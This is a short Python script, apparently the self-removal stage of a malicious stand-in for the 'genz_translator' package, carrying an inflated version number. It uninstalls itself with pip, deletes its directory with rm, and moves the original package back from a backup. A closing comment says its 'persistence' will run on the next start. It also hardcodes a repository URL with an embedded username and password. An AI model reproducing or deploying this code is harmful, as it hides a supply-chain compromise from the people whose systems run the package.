import os
import sys

VERSION = 'v9015.0.1'
PACKAGE_NAME = "genz_translator"
INTERNAL_REPO_IP = "servers.genzrulez.com"
INTERNAL_REPO_URL = "http://PyPiper:pyisthepiperthatpipesasweetmelody1!@servers.genzrulez.com:8010/simple/"

#Get install path
paths = sys.path
actual_path = ""
for path in paths:
    if (os.path.isdir(path + "/" + PACKAGE_NAME)):
        actual_path = path + "/"
        break

#Uninstall ourselves
os.system('pip3 --verbose uninstall ' + PACKAGE_NAME + ' -y')

#Remove all remnants of us
os.system('rm -r ' + actual_path + PACKAGE_NAME)

#Reintroduce only their code
os.system('mv ' + actual_path + PACKAGE_NAME + "BAK" + ' ' + actual_path + PACKAGE_NAME)

#Uninstall done - next run our persistence will execute

